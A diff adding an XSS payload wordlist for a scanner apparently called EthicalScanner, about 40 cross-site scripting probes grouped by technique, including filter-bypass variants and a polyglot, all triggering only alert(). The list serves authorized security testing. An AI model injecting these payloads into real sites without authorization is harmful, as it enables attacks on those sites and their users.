@@ -1,0 +1,55 @@
+# EthicalScanner - XSS sample wordlist
+# Format: one payload per line, # = comment
+# Only test systems you are authorized to test.
+
+# -- Basic --
+<script>alert('XSS')</script>
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<SCRIPT>alert('XSS')</SCRIPT>
+
+# -- Image tags --
+<img src=x onerror=alert('XSS')>
+<img src="x" onerror="alert('XSS')">
+<img src=1 href=1 onerror="javascript:alert(1)">
+<img src=# onmouseover="alert('XSS')">
+
+# -- SVG / HTML5 --
+<svg onload=alert('XSS')>
+<svg/onload=alert('XSS')>
+<svg onload="alert(1)">
+<body onload=alert('XSS')>
+<body/onload=alert('XSS')>
+
+# -- Attribute injection --
+"><script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+"><img src=x onerror=alert('XSS')>
+'><img src=x onerror=alert('XSS')>
+" onmouseover="alert(1)
+' onmouseover='alert(1)
+
+# -- JavaScript: protocol --
+javascript:alert('XSS')
+javascript:alert(1)
+JAVASCRIPT:alert('XSS')
+
+# -- iFrame --
+<iframe src=javascript:alert('XSS')>
+<iframe/src=javascript:alert('XSS')>
+<iframe onload=alert('XSS')>
+
+# -- HTML encoding --
+&#60;script&#62;alert('XSS')&#60;/script&#62;
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+
+# -- Filter bypass --
+<scr<script>ipt>alert('XSS')</scr</script>ipt>
+<<script>alert('XSS');//<</script>
+<script >alert('XSS')</script >
+
+# -- DOM XSS --
+?search=<script>alert('XSS')</script>
+
+# -- Polyglots --
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
